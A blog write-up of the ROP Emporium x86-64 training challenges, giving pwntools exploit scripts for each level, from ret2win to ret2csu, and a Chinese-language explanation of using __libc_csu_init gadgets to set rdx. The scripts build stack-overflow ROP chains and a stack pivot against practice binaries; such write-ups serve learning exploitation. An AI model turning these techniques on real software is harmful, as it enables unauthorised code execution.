---
layout: post
title:  "ROP-Emporium x86 Writeup"
date:   2021-03-28 11:59:00 +0900
categories: CTF
---

## ret2win
EXP:
```python
from pwn import *

sh = process("./ret2win")

x = b'1'*40 + p64(0x400756)

sh.sendline(x)
sh.interactive()
```

## split
EXP:
```python
from pwn import *

sh = process('./split')
payload = b'1'*40 + p64(0x4007c3) + p64(0x601060) + p64(0x40074b)
sh.sendline(payload)
sh.interactive()
```

## callme
EXP:
```python
from pwn import *

sh = process("./callme")

'''
'1' * 0x20 buffer 
'1' * 0x08 rbp
pop rdi,ret
0xdeadbeefdeadbeef
pop rsi,pop rdx, ret
0xcafebabecafebabe
0xd00df00dd00df00d
callme_one
pop rdi, ret
0xdeadbeefdeadbeef
pop rsi,pop rdx, ret
0xcafebabecafebabe
0xd00df00dd00df00d
callme two
pop rdi,ret
0xdeadbeefdeadbeef
pop rsi,pop rdx, ret
0xcafebabecafebabe
0xd00df00dd00df00d
callme three
'''

pop_rdi = 0x4009a3
pop_rsi = 0x40093d
p1 = 0xdeadbeefdeadbeef
p2 = 0xcafebabecafebabe
p3 = 0xd00df00dd00df00d
call_one = 0x400720
call_two = 0x400740
call_three = 0x4006f0

payload = b'1' * 0x28
payload += p64(pop_rdi) + p64(p1)
payload += p64(pop_rsi) + p64(p2) + p64(p3)
payload += p64(call_one)
payload += p64(pop_rdi) + p64(p1)
payload += p64(pop_rsi) + p64(p2) + p64(p3)
payload += p64(call_two)
payload += p64(pop_rdi) + p64(p1)
payload += p64(pop_rsi) + p64(p2) + p64(p3)
payload += p64(call_three)

#raw_input()
sh.send(payload)
sh.interactive()
```

## write4
EXP:
```python
from pwn import *

sh = process('./write4')

pop_r14_r15 = 0x400690
mov_r15_to_r14 = 0x400628
pop_rdi = 0x400693
bss = 0x601038
flag = 0x7478742e67616c66
func = 0x400510
payload = b'1'* 0x28
payload += p64(pop_r14_r15) + p64(bss) + p64(flag)
payload += p64(mov_r15_to_r14)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(func)

raw_input()
sh.send(payload)

sh.interactive()

```

## badchars
EXP:
```python
from pwn import *

sh = process('./badchars')

flag_value = 0x7479742f68626c66
plt = 0x400510
bss = 0x601038

pop_r12_15 = 0x40069c
pop_r14_r15 = 0x4006a0
mov_r12_to_r13 = 0x400634
pop_rdi = 0x4006a3
sub_r15 = 0x400630

payload = b'1'*0x28

payload += p64(pop_r12_15)
payload += p64(flag_value) + p64(bss) + p64(0x01) + p64(bss + 0x02)
payload += p64(mov_r12_to_r13)
payload += p64(sub_r15)

payload += p64(pop_r14_r15) + p64(0x01) + p64(bss + 0x03)
payload += p64(sub_r15)

payload += p64(pop_r14_r15) + p64(0x01) + p64(bss + 0x04)
payload += p64(sub_r15)

payload += p64(pop_r14_r15) + p64(0x01) + p64(bss + 0x06)
payload += p64(sub_r15)

payload += p64(pop_rdi) + p64(bss) + p64(plt)

sh.send(payload)
sh.interactive()

```

## fluff
EXP:
```python
from pwn import *

sh = process('./fluff')

pop_rdi = 0x4006a3
pop_rdx = 0x40062a
xlat = 0x400628
stosb = 0x400639
bss = 0x601038
off_len = 0x4000
plt = 0x400620

payload = b'1' * 0x28

payload += p64(pop_rdi) + p64(bss)

# f
payload += p64(pop_rdx) + p64(off_len) + p64(0x4003f4 - 0x3ef2 - 0x0b)
payload += p64(xlat) + p64(stosb)

# l
payload += p64(pop_rdx) + p64(off_len) + p64(0x4003f9 - 0x3ef2 - ord('f'))
payload += p64(xlat) + p64(stosb)

# a
payload += p64(pop_rdx) + p64(off_len) + p64(0x400418 - 0x3ef2 - ord('l'))
payload += p64(xlat) + p64(stosb)

# g
payload += p64(pop_rdx) + p64(off_len) + p64(0x4003cf - 0x3ef2 - ord('a'))
payload += p64(xlat) + p64(stosb)

# .
payload += p64(pop_rdx) + p64(off_len) + p64(0x400439 - 0x3ef2 - ord('g'))
payload += p64(xlat) + p64(stosb)

# t
payload += p64(pop_rdx) + p64(off_len) + p64(0x4003f1 - 0x3ef2 - ord('.'))
payload += p64(xlat) + p64(stosb)

# x
payload += p64(pop_rdx) + p64(off_len) + p64(0x4006c8 - 0x3ef2 - ord('t'))
payload += p64(xlat) + p64(stosb)

# t
payload += p64(pop_rdx) + p64(off_len) + p64(0x4003f1 - 0x3ef2 - ord('x'))
payload += p64(xlat) + p64(stosb)

# pop rdi
payload += p64(pop_rdi) + p64(bss)
payload += p64(plt)

raw_input()
sh.send(payload)

sh.interactive()

```

## pivot
EXP:
```python
from pwn import *

sh = process("./pivot")

offset = 0x0a81 - 0x96a
buf_address = 0
xchg_rax_rsp = 0x4009bd
pop_rax = 0x4009bb
useless = 0x400720
got_plt = 0x601040
mov_rax_rax = 0x4009c0
add_rax_rbp = 0x4009c4
jmp_rax = 0x4007c1

sh.recvuntil("pivot: ")
addr = sh.recvline()[:-1]

buf_address = int(addr, 16)
print("0x%x" % int(addr, 16))

heap_payload = p64(useless)
heap_payload += p64(pop_rax) + p64(got_plt)
heap_payload += p64(mov_rax_rax)
heap_payload += p64(add_rax_rbp)
heap_payload += p64(jmp_rax)

#stack
payload = b'a'*0x20
payload += p64(offset) # rbp
payload += p64(pop_rax)
payload += p64(buf_address)
payload += p64(xchg_rax_rsp)

sh.send(heap_payload + b'b'*100)
raw_input()
sh.send(payload)

sh.interactive()

```

## ret2csu 2021-04-04 00:35
题目中主要的困难在于构造调用ret2win中的rdx，因为从代码里是搜索不到类似：pop rdx，ret的代码片的，但通过观察可以看到在ret2csu的__libc_csu_init中包含部分可以对rdx赋值的代码，如下：
text:0000000000400640                 public __libc_csu_init
.text:0000000000400640 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:0000000000400640 ; __unwind {
.text:0000000000400640                 push    r15
.text:0000000000400642                 push    r14
.text:0000000000400644                 mov     r15, rdx
.text:0000000000400647                 push    r13
.text:0000000000400649                 push    r12
.text:000000000040064B                 lea     r12, __frame_dummy_init_array_entry
.text:0000000000400652                 push    rbp
.text:0000000000400653                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:000000000040065A                 push    rbx
.text:000000000040065B                 mov     r13d, edi
.text:000000000040065E                 mov     r14, rsi
.text:0000000000400661                 sub     rbp, r12
.text:0000000000400664                 sub     rsp, 8
.text:0000000000400668                 sar     rbp, 3
.text:000000000040066C                 call    _init_proc
.text:0000000000400671                 test    rbp, rbp
.text:0000000000400674                 jz      short loc_400696
.text:0000000000400676                 xor     ebx, ebx
.text:0000000000400678                 nop     dword ptr [rax+rax+00000000h]
.text:0000000000400680
.text:0000000000400680 loc_400680:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400680                 mov     rdx, r15
.text:0000000000400683                 mov     rsi, r14
.text:0000000000400686                 mov     edi, r13d
.text:0000000000400689                 call    qword ptr [r12+rbx*8]
.text:000000000040068D                 add     rbx, 1
.text:0000000000400691                 cmp     rbp, rbx
.text:0000000000400694                 jnz     short loc_400680
.text:0000000000400696
.text:0000000000400696 loc_400696:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400696                 add     rsp, 8
.text:000000000040069A                 pop     rbx
.text:000000000040069B                 pop     rbp
.text:000000000040069C                 pop     r12
.text:000000000040069E                 pop     r13
.text:00000000004006A0                 pop     r14
.text:00000000004006A2                 pop     r15
.text:00000000004006A4                 retn
.text:00000000004006A4 ; } // starts at 400640
.text:00000000004006A4 __libc_csu_init endp

代码中0000000000400680位置有对rdx的赋值，如果在函数后面的执行过程中不会破坏掉这个寄存器，那么就可以把对rdx的赋值转换为对r15的赋值了，因此手动调试，并对此函数（__libc_csu_init）手动设置传入参数，然后观察执行后的rdx是否有被修改，经过测试可以满足预期，因此可以使用这种方式，来构造rdx，但同时注意在调用__libc_csu_init时，不能直接调用开始位置，因为这样会把r15寄存器修改掉，因此选择其后面的指令作为开始，这样就需要在压入两个寄存器来平衡栈数据（shellcode += p64(csu_address) + p64(0) + p64(0)）

EXP:
```python
from pwn import *

sh = process("./ret2csu")

pop_rdi = 0x4006a3
pop_rsi_r15 = 0x4006a1
csu_address = 0x400647
call_ret2win = 0x400510

shellcode = b'A' * 0x28
shellcode += p64(pop_rdi) + p64(0xdeadbeefdeadbeef)
shellcode += p64(pop_rsi_r15) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
shellcode += p64(csu_address) + p64(0) + p64(0)
shellcode += p64(pop_rdi) + p64(0xdeadbeefdeadbeef)
shellcode += p64(pop_rsi_r15) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
shellcode += p64(0x40062a)

raw_input()
sh.send(shellcode)
sh.interactive()
```